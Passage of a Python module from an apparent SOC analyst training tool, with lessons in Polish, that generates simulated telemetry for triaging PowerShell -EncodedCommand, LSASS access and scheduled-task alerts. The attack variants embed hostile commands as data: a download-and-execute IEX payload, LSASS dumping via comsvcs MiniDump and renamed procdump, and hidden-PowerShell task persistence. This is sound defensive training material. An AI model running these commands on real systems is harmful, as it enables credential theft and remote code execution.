"""Endpoint scenarios: process, registry and Windows Security telemetry."""

from __future__ import annotations

import base64

from hunterscope.trainer import sources as src
from hunterscope.trainer.model import Lessons
from hunterscope.trainer.scenarios.base import Builder, Proc, noise, template

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
SYSTEM = "NT AUTHORITY\\SYSTEM"


def _b64(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


# ======================================================================================================================
# PowerShell -EncodedCommand
# ======================================================================================================================
LESSONS_PS = Lessons(
    title="PowerShell z -EncodedCommand",
    category="Endpoint",
    tp_signs=[
        "Rodzic to aplikacja biurowa, przeglądarka albo wscript/mshta. Te programy nie uruchamiają PowerShella w legalnej pracy.",
        "Po zdekodowaniu: pobieranie i wykonanie kodu z internetu (DownloadString, IEX, Invoke-WebRequest), -w hidden, -nop, -ep bypass.",
        "Zaraz po uruchomieniu połączenie do świeżej, nieznanej domeny; w proxy User-Agent „WindowsPowerShell”.",
        "Jeden host, jeden użytkownik, brak wpisu w kalendarzu zmian.",
    ],
    fp_signs=[
        "Rodzic to narzędzie zarządzania (CcmExec.exe z SCCM, agent RMM, Intune, Rundeck), konto SYSTEM albo konto administratora.",
        "Ta sama komenda (ten sam skrót) na wielu hostach w tym samym oknie czasowym.",
        "Zdekodowany skrypt działa lokalnie (rejestr, WMI, pliki) albo na serwerach z wpisu zmiany, bez ruchu do nieznanych domen.",
        "Kalendarz zmian pasuje do hosta, czasu i wykonawcy.",
    ],
    checklist=[
        "Zdekoduj Base64 (UTF-16LE) i przeczytaj, co skrypt robi. Nie oceniaj po samym „-enc”.",
        "Kto jest rodzicem i jak wygląda cały łańcuch procesów (zakładka Drzewo procesów)?",
        "Na jakim koncie i z jakiego hosta? Czy to konto normalnie tak pracuje?",
        "Czy zaraz po było połączenie sieciowe (Sysmon 3, proxy, DNS)? Do kogo, jak stara jest domena?",
        "Czy ta sama komenda pojawiła się na innych hostach?",
        "Kalendarz zmian, okno serwisowe, ticket.",
        "Co powstało na dysku i w autostarcie po uruchomieniu?",
    ],
    pitfalls=[
        "Samo „-enc” nie jest dowodem. Legalne narzędzia administracyjne też go używają.",
        "Samo „SYSTEM” nie oznacza legalności. Patrz na rodzica i cel działania.",
        "Brak wpisu w TI to nie to samo co „bezpieczna”. Sprawdź wiek domeny i to, ilu użytkowników ją odwiedziło.",
    ],
    attack=["T1059.001 PowerShell", "T1027 Obfuscated Files or Information", "T1204.002 User Execution: Malicious File",
            "T1105 Ingress Tool Transfer"],
    tips=[
        "ESET Inspect: zakładka Executables → Process tree. Pokaż cały łańcuch i filtruj po CommandLine zawierającym „-enc”.",
        "SIEM: CommandLine=*-enc* | stats dc(host) by CommandLine. Liczba hostów od razu mówi, czy to wdrożenie, czy pojedynczy incydent.",
        "CyberChef: From Base64 → Decode text (UTF-16LE). Zakładka Narzędzia w tym trenerze robi to samo.",
    ],
    hints=[
        "Zdekoduj parametr -enc. Co ten skrypt faktycznie robi?",
        "Spójrz na proces nadrzędny oraz na to, na ilu hostach pojawiła się ta sama komenda.",
        "W zakładce Kontekst sprawdź kalendarz zmian dla hosta i reputację domeny, jeśli skrypt łączy się z internetem.",
    ],
)


@template("ps_encoded", ("tp", "fp", "btp"), LESSONS_PS)
def ps_encoded(b: Builder, variant: str) -> None:
    {"tp": _ps_tp, "fp": _ps_fp, "btp": _ps_btp}[variant](b)


def _ps_tp(b: Builder) -> None:
    w, rng = b.w, b.rng
    b.at_hour(rng.choice([9, 10, 11, 13, 14, 15, 2, 3]))
    p = b.person(rng.choice(["Księgowość", "HR", "Sprzedaż"]))
    sess = b.session(p)
    domain, ip = w.bad_domain(), w.attacker_ip()
    sender_domain = w.bad_domain()
    url = f"https://{domain}/a/update.ps1"
    payload = f"IEX ((New-Object Net.WebClient).DownloadString('{url}'))"
    enc = _b64(payload)
    attachment = "Faktura_VAT_03_2026.docm"

    spf_fail = not b.hard
    b.add(src.mail(b.t(-11), f"ksiegowosc@{sender_domain}", p.upn, "Zaległa faktura VAT, ostateczne wezwanie do zapłaty",
                   attachment, spf="fail" if spf_fail else "pass", dkim="none" if spf_fail else "pass",
                   dmarc="fail" if spf_fail else "pass", sender_ip=w.attacker_ip())).key(
        "Wiadomość z domeny spoza organizacji, z załącznikiem .docm i presją czasu. "
        + ("SPF/DKIM/DMARC nie przechodzą." if spf_fail else
           "SPF przechodzi, ale tylko dlatego, że atakujący skonfigurował go dla własnej domeny. Przejście SPF nie oznacza zaufania."))
    doc = rf"{p.profile}\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\{rng.randint(1000, 9999)}ABC\{attachment}"
    _, word = b.spawn(sess["outlook"], r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                      f'"WINWORD.EXE" /n "{doc}"', b.t(-4), p.host, p.sam, signer="Microsoft Corporation", cwd=p.profile)
    ev, cmd = b.spawn(word, CMD, f"cmd.exe /c powershell.exe -nop -w hidden -ep bypass -enc {enc}", b.t(-0.5), p.host, p.sam)
    ev.key("WINWORD.EXE uruchamia cmd.exe. Makro w dokumencie odpaliło powłokę, czego Word nie robi w normalnej pracy.")
    trigger, ps = b.spawn(cmd, PS, f"powershell.exe -nop -w hidden -ep bypass -enc {enc}", b.t(0), p.host, p.sam)
    trigger.key(f"Po zdekodowaniu: {payload}. Pobranie i wykonanie kodu z internetu, ukryte okno, bez profilu, z ominięciem polityki.")
    b.add(src.dns(b.t(0, 2), p.ip, domain, "A", "NOERROR", ip, host=p.host))
    b.add(src.sysmon_net(b.t(0, 3), p.host, p.netbios, PS, ps.pid, ip, 443, domain, src_ip=p.ip)).key(
        f"powershell.exe łączy się z nieznaną domeną {domain} zaraz po starcie. To jest etap pobierania.")
    if not b.hard:
        b.add(src.proxy(b.t(0, 4), p.ip, p.sam, "GET", url, 200, 412, 18_432,
                        ua="Mozilla/5.0 (Windows NT; Windows NT 10.0; pl-PL) WindowsPowerShell/5.1.22621.2506",
                        category="Newly Registered Domain", content_type="text/plain", host=p.host)).key(
            "User-Agent „WindowsPowerShell” i kategoria „Newly Registered Domain”: skrypt faktycznie został pobrany (200, 18 KB).")
    b.add(src.sysmon_file(b.t(0, 40), p.host, p.netbios, PS, ps.pid,
                          rf"{p.profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk")).key(
        "Skrót w folderze Autostart o nazwie udającej OneDrive. Ustanowiona persystencja.")
    b.ti_bad(domain, "domena", age_days=2, tags="downloader, phishing")
    b.ti_bad(ip, "IP", age_days=2, tags="hosting, C2")
    noise(b, involved=[p])
    truth = b.truth(
        "tp", "high",
        f"Fałszywa faktura (.docm) z domeny {sender_domain} uruchomiła makro: WINWORD → cmd → ukryty PowerShell. Zdekodowany "
        f"payload pobiera i wykonuje skrypt z świeżej domeny {domain}. Host ma persystencję w Autostarcie, użytkownik jest zainfekowany.",
        f"TP. {p.host} ({p.sam}): WINWORD.EXE → cmd.exe → powershell -nop -w hidden -ep bypass -enc. Payload: IEX DownloadString "
        f"{url}. Połączenie z {ip}:443, utworzony skrót Startup\\OneDriveSync.lnk. Źródło: mail od {sender_domain}, "
        f"załącznik {attachment}. Eskaluję do L2, proszę o izolację hosta i blokadę domeny/IP. Do sprawdzenia: inni odbiorcy tej wiadomości.",
        required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
    b.finish(trigger, source="SIEM", rule="Suspicious PowerShell: encoded command", severity="high",
             description=f"powershell.exe uruchomiony z parametrem -EncodedCommand na hoście {p.host}.", truth=truth,
             lessons=LESSONS_PS)


def _ps_fp(b: Builder) -> None:
    rng = b.rng
    b.at_hour(rng.choice([1, 2, 3]), weekday=True)
    p = b.person()
    others = [b.w.person() for _ in range(3 if b.hard else 6)]
    b.server("SRV-SCCM01")
    script = (r"Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,"
              r"DisplayVersion,Publisher | ConvertTo-Json -Compress | Out-File -Encoding utf8 'C:\Windows\CCM\Logs\swinv.json'")
    enc = _b64(script)
    cmdline = f"powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand {enc}"
    ccm = Proc(b.w.pid(), r"C:\Windows\CCM\CcmExec.exe", r"C:\Windows\CCM\CcmExec.exe")
    trigger, ps = b.spawn(ccm, PS, cmdline, b.t(0), p.host, SYSTEM, cwd=r"C:\Windows\CCM")
    trigger.herring("-ExecutionPolicy Bypass i -EncodedCommand wyglądają groźnie, ale tak SCCM uruchamia własne skrypty.")
    b.add(src.sysmon_file(b.t(0, 4), p.host, SYSTEM, PS, ps.pid, r"C:\Windows\CCM\Logs\swinv.json", size="38 KB")).key(
        "Wynik skryptu trafia do lokalnego katalogu logów klienta SCCM. Brak ruchu do internetu, to inwentaryzacja oprogramowania.")
    for o in others:
        _, _ = b.spawn(Proc(b.w.pid(), ccm.image, ccm.cmd), PS, cmdline, b.t(rng.uniform(-3, 2.5)), o.host, SYSTEM, cwd=r"C:\Windows\CCM")
    for ev in b.events[-len(others):]:
        ev.key("Ta sama komenda, ten sam rodzic (CcmExec.exe), konto SYSTEM, na wielu hostach w kilka minut. To wdrożenie, nie pojedynczy atak.")
    b.change("*", b.t(-90), b.t(150), "Inwentaryzacja oprogramowania: Compliance Baseline v3 (SCCM), wszystkie stacje robocze", "CHG-1042")
    noise(b, profile="night", involved=[p])
    truth = b.truth(
        "fp", "info",
        "Skrypt uruchomiony przez agenta SCCM (CcmExec.exe) jako SYSTEM, taki sam na wielu stacjach w oknie zmiany CHG-1042. "
        "Parametry -EncodedCommand i -ExecutionPolicy Bypass to standard przy wdrażaniu skryptów z SCCM.",
        f"FP. {p.host}: powershell -EncodedCommand uruchomiony przez CcmExec.exe (SCCM), konto SYSTEM. Zdekodowany skrypt czyta listę zainstalowanych "
        f"programów i zapisuje do C:\\Windows\\CCM\\Logs. Ta sama komenda na {len(others) + 1} hostach, zmiana CHG-1042 obejmuje wszystkie stacje. Zamykam jako FP.",
        required=[], harmful=["block_ioc"], lookups=[f"change:{p.host}"])
    b.finish(trigger, source="SIEM", rule="Suspicious PowerShell: encoded command", severity="high",
             description=f"powershell.exe uruchomiony z parametrem -EncodedCommand na hoście {p.host}.", truth=truth,
             lessons=LESSONS_PS)


def _ps_btp(b: Builder) -> None:
    w, rng = b.w, b.rng
    b.at_hour(rng.choice([21, 22]))
    ap = w.person("IT")
    sam = b.admin("adm_" + ap.sam, ap.display)
    b.server("JUMP01")
    b.server("SRV-FILE01")
    b.server("SRV-SQL01")
    user = f"NORDWIND\\{sam}"
    script = ("Invoke-Command -ComputerName SRV-FILE01,SRV-SQL01 -ScriptBlock { Restart-Service -Name 'ErpSync','WmsAgent' -Force }")
    enc = _b64(script)
    b.add(src.logon_ok(b.t(-25), "JUMP01", sam, ap.ip, 10, workstation=ap.host))
    explorer = Proc(w.pid(), r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE")
    _, cmd = b.spawn(explorer, CMD, "cmd.exe", b.t(-6), "JUMP01", user)
    trigger, ps = b.spawn(cmd, PS, f"powershell.exe -ExecutionPolicy Bypass -EncodedCommand {enc}", b.t(0), "JUMP01", user)
    trigger.herring("Zakodowane polecenie uruchomione ręcznie z cmd.exe. Wygląda podejrzanie, dopóki nie zdekodujesz skryptu i nie sprawdzisz zmiany.")
    for srv, ipx in (("SRV-FILE01", "10.10.20.5"), ("SRV-SQL01", "10.10.20.12")):
        b.add(src.sysmon_net(b.t(0, 3), "JUMP01", user, PS, ps.pid, ipx, 5985, srv, src_ip="10.10.40.5")).key(
            f"WinRM (5985) z serwera skokowego do {srv}. To dokładnie te serwery, które są w zakresie zmiany.")
    b.change("jump01", b.t(-60), b.t(60), f"Restart usług ERP po aktualizacji v8.4 na SRV-FILE01 i SRV-SQL01. Wykonawca: {sam}", "CHG-1119")
    b.ctx.users[sam]["Typowe stanowiska logowania"] = "wyłącznie JUMP01 (RDP z sieci IT)"
    noise(b, profile="night", involved=[])
    truth = b.truth(
        "btp", "info",
        f"Detekcja jest zasadna (zakodowany PowerShell z konta administracyjnego), ale to zaplanowana praca: {sam} z JUMP01 restartuje usługi "
        "ERP na serwerach wskazanych w zmianie CHG-1119, w oknie serwisowym.",
        f"BTP. JUMP01, {sam}: powershell -EncodedCommand. Skrypt: Invoke-Command na SRV-FILE01/SRV-SQL01, restart usług ErpSync i WmsAgent. "
        f"Zmiana CHG-1119 (wykonawca {sam}, okno obejmuje czas alertu). Aktywność zgodna z kontem, hostem i celem. Zamykam, bez eskalacji.",
        lookups=["change:jump01", f"user:{sam}"])
    b.finish(trigger, source="SIEM", rule="Suspicious PowerShell: encoded command", severity="high",
             description="powershell.exe uruchomiony z parametrem -EncodedCommand na hoście JUMP01.", truth=truth, lessons=LESSONS_PS)


# ======================================================================================================================
# LSASS access
# ======================================================================================================================
LESSONS_LSASS = Lessons(
    title="Dostęp do pamięci LSASS",
    category="Endpoint",
    tp_signs=[
        "Źródłem dostępu jest narzędzie, które nie jest produktem bezpieczeństwa: rundll32 + comsvcs.dll MiniDump, procdump, nieznany plik w ProgramData/Temp.",
        "Maska GrantedAccess 0x1FFFFF albo 0x1010 z VM_READ. Zaraz potem powstaje plik .dmp.",
        "Nazwa pliku nie zgadza się z OriginalFileName (np. svchost.exe, które w środku jest procdump.exe) albo ścieżka jest nietypowa.",
        "Po zrzucie konto administracyjne loguje się na serwerze z tej stacji roboczej, z której normalnie nigdy tego nie robi.",
    ],
    fp_signs=[
        "Źródłem jest podpisany produkt bezpieczeństwa (ekrn.exe z ESET) z Program Files.",
        "Dostęp o ograniczonej masce (np. 0x1410: tylko odczyt informacji), bez tworzenia plików zrzutu i bez procesów potomnych.",
        "To samo zdarzenie z tego samego procesu na wielu hostach i cyklicznie.",
    ],
    checklist=[
        "Kto (SourceImage), jaka maska (GrantedAccess), z jakiej ścieżki, podpisany przez kogo?",
        "Czy OriginalFileName zgadza się z nazwą pliku?",
        "Czy powstał plik .dmp (Sysmon 11) i czy ktoś go potem czytał lub wysłał?",
        "Rodzic źródłowego procesu: czy to interaktywna sesja użytkownika?",
        "Hash w TI i występowanie w organizacji.",
        "Logowania kont uprzywilejowanych po zdarzeniu, zwłaszcza z tej stacji.",
    ],
    pitfalls=[
        "Nazwa pliku jest do podrobienia. Patrz na ścieżkę, podpis i OriginalFileName.",
        "Narzędzie Microsoftu (procdump) jest podpisane, więc „podpisany” nie znaczy „bezpieczny w tym kontekście”.",
        "Nie wystarczy ocenić zdarzenia 10 samego. Szukaj pliku zrzutu i późniejszych logowań.",
    ],
    attack=["T1003.001 OS Credential Dumping: LSASS Memory", "T1021.002 SMB/Windows Admin Shares", "T1078 Valid Accounts"],
    tips=[
        "Sysmon EID 10 (ProcessAccess), filtr TargetImage=*\\lsass.exe. Zawsze sprawdzaj GrantedAccess i CallTrace.",
        "ESET Inspect: reguły dotyczące LSASS pokazują proces źródłowy i jego łańcuch rodziców.",
        "Po potwierdzeniu: reset haseł kont, które mogły być w pamięci (użytkownik i administratorzy logujący się na ten host).",
    ],
    hints=[
        "Kto czyta pamięć LSASS i czy jest to narzędzie bezpieczeństwa?",
        "Sprawdź maskę dostępu, ścieżkę, podpis i OriginalFileName procesu źródłowego.",
        "Poszukaj w logach pliku .dmp oraz logowań kont administracyjnych po zdarzeniu.",
    ],
)


@template("lsass_access", ("tp", "fp"), LESSONS_LSASS)
def lsass_access(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    if variant == "tp":
        b.at_hour(rng.choice([2, 3, 23, 14]))
        p = b.person(rng.choice(["Sprzedaż", "Logistyka", "Marketing"]))
        b.ctx.assets[p.host.lower()]["Lokalny administrator"] = "Tak (wyjątek dla starej aplikacji magazynowej)"
        ap = w.person("IT")
        adm = b.admin("adm_" + ap.sam, ap.display, **{"Typowe stanowiska logowania": "wyłącznie JUMP01"})
        b.server("SRV-FILE01")
        sess = b.session(p)
        _, cmd = b.spawn(sess["explorer"], CMD, "cmd.exe", b.t(-8), p.host, p.sam, integrity="High", cwd=p.profile)
        lsass_pid = rng.randrange(600, 900, 4)
        if b.hard:
            image = r"C:\ProgramData\Intel\Drivers\svchost.exe"
            line = r"svchost.exe -accepteula -ma lsass.exe C:\ProgramData\Intel\Drivers\c.dmp"
            dump = r"C:\ProgramData\Intel\Drivers\c.dmp"
            trigger_note = ("Plik nazywa się svchost.exe, ale leży w ProgramData\\Intel\\Drivers, a OriginalFileName to procdump.exe. "
                            "Narzędzie Sysinternals jest podpisane przez Microsoft, więc sam podpis niczego nie rozstrzyga.")
            _, tool = b.spawn(cmd, image, line, b.t(-1), p.host, p.sam, integrity="High", original="procdump.exe",
                              signer="Microsoft Corporation")
        else:
            image = r"C:\Windows\System32\rundll32.exe"
            dump = r"C:\Users\Public\lsa.dmp"
            line = rf"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump {lsass_pid} {dump} full"
            trigger_note = "Klasyczna technika: rundll32 + comsvcs.dll MiniDump na PID lsass.exe. Zrzut pamięci z hasłami i hashami."
            _, tool = b.spawn(cmd, image, line, b.t(-1), p.host, p.sam, integrity="High")
        b.events[-1].key(trigger_note)
        trigger = b.add(src.sysmon_access(b.t(0), p.host, p.netbios, image, r"C:\Windows\System32\lsass.exe", "0x1FFFFF"))
        trigger.key("Pełny dostęp (0x1FFFFF) do lsass.exe z narzędzia użytkownika, nie z produktu bezpieczeństwa.")
        b.add(src.sysmon_file(b.t(0, 6), p.host, p.netbios, image, tool.pid, dump, size="52 MB")).key(
            "Powstał plik zrzutu pamięci LSASS. To jest to, czego atakujący potrzebował.")
        b.add(src.logon_ok(b.t(24), "SRV-FILE01", adm, p.ip, 3, workstation=p.host)).key(
            f"Konto administracyjne {adm} loguje się na serwer plików ze stacji {p.host}, a normalnie loguje się tylko z JUMP01. "
            "Poświadczenia z zrzutu zostały użyte.")
        b.add(src.winsec(b.t(24, 1), "SRV-FILE01", 4672, "Special privileges assigned to new logon",
                         {"SubjectUserName": adm, "PrivilegeList": "SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege"},
                         f"Nadano uprawnienia specjalne: {adm}", adm))
        noise(b, profile="night" if b.t0.hour < 6 else "office", involved=[p])
        truth = b.truth(
            "tp", "critical",
            f"Z narzędzia uruchomionego przez użytkownika ({'przemianowany procdump' if b.hard else 'rundll32 + comsvcs.dll'}) wykonano zrzut "
            f"pamięci lsass.exe do {dump}. Po 24 minutach konto {adm} zalogowało się na SRV-FILE01 z tej stacji. To kradzież poświadczeń i ruch boczny.",
            f"TP, krytyczne. {p.host}: {basename_of(image)} → lsass.exe (0x1FFFFF), zrzut {dump}. Po zdarzeniu logowanie {adm} na SRV-FILE01 ze stacji {p.host} "
            "(konto normalnie pracuje tylko z JUMP01). Eskaluję natychmiast do L2, wnoszę o izolację hosta i reset haseł użytkownika oraz konta administracyjnego.",
            required=["isolate_host", "reset_creds"], lookups=[f"user:{adm}"])
    else:
        b.at_hour(rng.choice([2, 4, 11, 15]))
        p = b.person()
        others = [w.person() for _ in range(3 if b.hard else 5)]
        ekrn = r"C:\Program Files\ESET\ESET Security\ekrn.exe"
        sha = w.digest("ekrn.exe")
        services = Proc(w.pid(), r"C:\Windows\System32\services.exe", r"C:\Windows\system32\services.exe")
        ev, ek = b.spawn(services, ekrn, r'"C:\Program Files\ESET\ESET Security\ekrn.exe"', b.t(-5 if b.hard else -170), p.host, SYSTEM,
                         signer="ESET, spol. s r.o.", sha256=sha)
        ev.key("ekrn.exe to usługa ESET: podpisana przez ESET, z Program Files, uruchomiona przez services.exe."
               + (" Zrestartowała się po aktualizacji modułów, stąd świeża aktywność." if b.hard else ""))
        for minutes in (-120, -60):
            b.add(src.sysmon_access(b.t(minutes), p.host, SYSTEM, ekrn, r"C:\Windows\System32\lsass.exe", "0x1410")).herring(
                "Wcześniejsze identyczne zdarzenie. Cykliczność to cecha produktu, nie ataku.")
        trigger = b.add(src.sysmon_access(b.t(0), p.host, SYSTEM, ekrn, r"C:\Windows\System32\lsass.exe", "0x1410"))
        trigger.herring("Dostęp do lsass.exe wygląda groźnie, ale to ograniczona maska 0x1410 (odczyt informacji) z podpisanego produktu ESET.")
        for o in others:
            b.add(src.sysmon_access(b.t(rng.uniform(-30, 20)), o.host, SYSTEM, ekrn, r"C:\Windows\System32\lsass.exe", "0x1410")).key(
                "To samo zdarzenie z tego samego procesu na innych hostach. Zachowanie produktu zainstalowanego wszędzie.")
        b.ti_good(sha, "hash", owner="ESET, spol. s r.o.", hosts_seen=len(others) + 120)
        noise(b, profile="night" if b.t0.hour < 6 else "office", involved=[p])
        truth = b.truth(
            "fp", "info",
            "Dostęp do LSASS wykonuje ekrn.exe, usługa ESET Security (podpisana, z Program Files) z maską 0x1410. Zdarzenie powtarza się cyklicznie "
            "i występuje na wielu hostach, nie powstał żaden plik zrzutu ani proces potomny.",
            f"FP. {p.host}: ekrn.exe (ESET, podpisany, C:\\Program Files\\ESET) → lsass.exe, GrantedAccess 0x1410. Zdarzenie cykliczne, widoczne na "
            f"{len(others) + 1} hostach, brak pliku .dmp i procesów potomnych, hash znany. Zamykam jako FP, proponuję wyjątek dla ekrn.exe w regule.",
            required=[], harmful=["isolate_host"], lookups=[f"ti:{sha}"])
    b.finish(trigger, source="SIEM", rule="Process accessed LSASS memory", severity="critical",
             description=f"Proces uzyskał dostęp do pamięci lsass.exe na hoście {p.host}.", truth=truth, lessons=LESSONS_LSASS)


def basename_of(path: str) -> str:
    return path.rsplit("\\", 1)[-1]


# ======================================================================================================================
# Persistence: scheduled task
# ======================================================================================================================
LESSONS_TASK = Lessons(
    title="Nowe zaplanowane zadanie (persystencja)",
    category="Endpoint",
    tp_signs=[
        "Zadanie utworzone przez skrypt (wscript, powershell, cmd) uruchomiony z profilu użytkownika, nie przez instalator.",
        "Akcja wskazuje na katalog zapisywalny przez użytkownika (AppData, Temp, Public) i uruchamia powłokę z ukrytym oknem.",
        "Nazwa udaje komponent systemu lub produktu (Edge, Update, Microsoft), ale ścieżka nie pasuje do prawdziwego komponentu.",
        "Chwilę wcześniej pobrano plik z Internetu (Mark-of-the-Web) i uruchomiono go ręcznie.",
    ],
    fp_signs=[
        "Twórcą jest znany, podpisany aktualizator (np. GoogleUpdate.exe) albo instalator wdrożony z SCCM.",
        "Akcja wskazuje na katalog Program Files lub inną chronioną lokalizację, podpisany plik wykonywalny.",
        "Zadanie występuje na wielu hostach z tą samą nazwą i działaniem.",
        "Jest wpis w kalendarzu zmian lub pakiet na liście zatwierdzonego oprogramowania.",
    ],
    checklist=[
        "Kto utworzył zadanie (rodzic schtasks.exe lub proces COM)? Co działo się chwilę wcześniej?",
        "Co dokładnie uruchamia zadanie: ścieżka, argumenty, konto, częstotliwość?",
        "Czy plik docelowy istnieje, kto go utworzył i czy jest podpisany?",
        "Czy nazwa zadania pasuje do prawdziwego komponentu?",
        "Czy to samo zadanie jest na innych hostach?",
        "Czy jest zmiana lub pakiet w SCCM?",
    ],
    pitfalls=[
        "Dobra nazwa zadania nic nie znaczy. Sprawdzaj ścieżkę i podpis pliku.",
        "Nieznane ≠ złośliwe: własny agent firmy też jest niepodpisany. Zweryfikuj w kalendarzu zmian i w ewidencji oprogramowania.",
    ],
    attack=["T1053.005 Scheduled Task", "T1059.007 JavaScript", "T1204.002 User Execution"],
    tips=[
        "Windows Security 4698 zawiera pełny XML zadania: czytaj Actions/Exec, nie tylko nazwę.",
        "Sysmon 1 dla schtasks.exe pokazuje rodzica. To zwykle rozstrzyga, kto stoi za zadaniem.",
        "ESET Inspect → Tasks / Scheduled tasks: porównaj z innymi hostami (ta sama nazwa i hash).",
    ],
    hints=[
        "Co dokładnie uruchamia to zadanie i skąd?",
        "Kto utworzył zadanie? Spójrz na łańcuch rodziców schtasks.exe lub proces, który wykonał operację.",
        "Sprawdź podpis, ścieżkę i występowanie tego samego zadania na innych hostach oraz kalendarz zmian.",
    ],
)


@template("persistence_task", ("tp", "fp", "btp"), LESSONS_TASK)
def persistence_task(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    if variant == "tp":
        b.at_hour(rng.choice([10, 11, 14, 15, 1]))
        p = b.person()
        sess = b.session(p)
        domain = w.bad_domain()
        script = rf"{p.profile}\AppData\Roaming\Microsoft\upd.ps1"
        js = rf"{p.profile}\Downloads\Faktura_marzec.pdf.js"
        b.add(src.sysmon_file(b.t(-6), p.host, p.netbios, r"C:\Program Files\Google\Chrome\Application\chrome.exe", sess["chrome"].pid, js))
        b.add(src.sysmon_motw(b.t(-6, 1), p.host, p.netbios, js, f"https://{domain}/f/faktura", referrer="https://mail.example/")).key(
            f"Plik pobrany z Internetu ({domain}). Podwójne rozszerzenie .pdf.js ma udawać dokument.")
        ev, wsh = b.spawn(sess["explorer"], r"C:\Windows\System32\wscript.exe", rf'"C:\Windows\System32\wscript.exe" "{js}"',
                          b.t(-4), p.host, p.sam, cwd=rf"{p.profile}\Downloads")
        ev.key("Użytkownik uruchomił skrypt JavaScript przez wscript.exe z folderu Pobrane.")
        tname = "MicrosoftEdgeUpdateCoreTask2"
        action = rf'powershell.exe -w hidden -ep bypass -f "{script}"'
        trigger_ev, st = b.spawn(wsh, r"C:\Windows\System32\schtasks.exe",
                                 rf'schtasks.exe /create /tn "{tname}" /tr "{action}" /sc minute /mo 15 /f',
                                 b.t(-0.5), p.host, p.sam)
        trigger_ev.key("Skrypt wscript.exe tworzy zadanie harmonogramu uruchamiane co 15 minut.")
        trigger = b.add(src.winsec(b.t(0), p.host, 4698, "A scheduled task was created", {
            "SubjectUserName": p.sam, "TaskName": rf"\{tname}", "Author": p.netbios, "Command": "powershell.exe",
            "Arguments": rf'-w hidden -ep bypass -f "{script}"', "Trigger": "Repetition every 15 minutes", "RunLevel": "LeastPrivilege",
        }, f"Utworzono zadanie \\{tname}: powershell -w hidden -f upd.ps1", p.sam))
        trigger.key("Nazwa udaje komponent Edge, ale akcja to ukryty PowerShell uruchamiający skrypt z AppData\\Roaming. Prawdziwy EdgeUpdate działa z Program Files (x86).")
        b.add(src.sysmon_file(b.t(-0.3), p.host, p.netbios, PS, w.pid(), script, size="2 KB")).key(
            "Skrypt docelowy zadania został zapisany w profilu użytkownika chwilę wcześniej.")
        ip = w.attacker_ip()
        b.add(src.sysmon_net(b.t(15, 2), p.host, p.netbios, PS, w.pid(), ip, 443, domain, src_ip=p.ip)).key(
            "Po 15 minutach zadanie uruchamia się i łączy z tą samą domeną co plik JS. Persystencja działa.")
        b.ti_bad(domain, "domena", age_days=4, tags="downloader")
        noise(b, involved=[p])
        truth = b.truth(
            "tp", "high",
            f"Użytkownik uruchomił pobrany plik Faktura_marzec.pdf.js; skrypt utworzył zadanie „{tname}” (udaje Edge), które co 15 minut odpala ukryty PowerShell "
            "z AppData i łączy się z domeną atakującego.",
            f"TP. {p.host}: wscript.exe ({js}) → schtasks /create \"{tname}\" → powershell -w hidden -f {script}, co 15 min. Plik z MOTW z {domain}. "
            "Zadanie już wykonało połączenie do tej domeny. Eskaluję do L2, wnoszę o izolację hosta i blokadę domeny.",
            required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
    elif variant == "fp":
        b.at_hour(rng.choice([11, 13, 15, 9]))
        p = b.person()
        updater = r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"
        sha = w.digest("googleupdate")
        trigger = b.add(src.winsec(b.t(0), p.host, 4698, "A scheduled task was created", {
            "SubjectUserName": SYSTEM, "TaskName": r"\GoogleUpdateTaskMachineUA", "Author": SYSTEM, "Command": updater,
            "Arguments": "/ua /installsource scheduler", "Trigger": "Daily, repeat every 1 hour", "RunLevel": "LeastPrivilege",
        }, r"Utworzono zadanie \GoogleUpdateTaskMachineUA: GoogleUpdate.exe /ua", SYSTEM))
        trigger.herring("Nowe zadanie harmonogramu to ogólny sygnał persystencji, ale tu akcja to konkretny, podpisany aktualizator.")
        services = Proc(w.pid(), r"C:\Windows\System32\services.exe", "services.exe")
        ev, upd = b.spawn(services, updater, r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc', b.t(-0.5), p.host, SYSTEM,
                          signer="Google LLC", sha256=sha)
        ev.key("GoogleUpdate.exe: podpisany przez Google LLC, uruchomiony przez usługę, ze standardowej ścieżki Program Files (x86).")
        b.add(src.sysmon_file(b.t(-1), p.host, SYSTEM, r"C:\Program Files\Google\Chrome\Application\chrome.exe", w.pid(),
                              r"C:\Program Files (x86)\Google\Update\Install\{" + w.digest("g1")[:8] + "}\\chrome_installer.exe")).key(
            "Chwilę wcześniej Chrome pobrał własną aktualizację. To normalny cykl życia aktualizatora.")
        for o in [w.person() for _ in range(4)]:
            b.add(src.winsec(b.t(rng.uniform(-60, 30)), o.host, 4698, "A scheduled task was created", {
                "SubjectUserName": SYSTEM, "TaskName": r"\GoogleUpdateTaskMachineUA", "Command": updater,
                "Arguments": "/ua /installsource scheduler"}, r"Utworzono zadanie \GoogleUpdateTaskMachineUA", SYSTEM)).key(
                "To samo zadanie z tą samą akcją na innych hostach.")
        b.ti_good(sha, "hash", owner="Google LLC", hosts_seen=380)
        noise(b, involved=[p])
        truth = b.truth(
            "fp", "info",
            "Zadanie \\GoogleUpdateTaskMachineUA to element aktualizatora Chrome, tworzony przez GoogleUpdate.exe (podpisany, Program Files). "
            "Takie samo zadanie istnieje na innych hostach.",
            f"FP. {p.host}: zadanie GoogleUpdateTaskMachineUA, akcja C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua, "
            "twórca SYSTEM po aktualizacji Chrome, plik podpisany Google LLC, to samo zadanie na innych hostach. Zamykam jako FP, wnoszę o wyjątek w regule.",
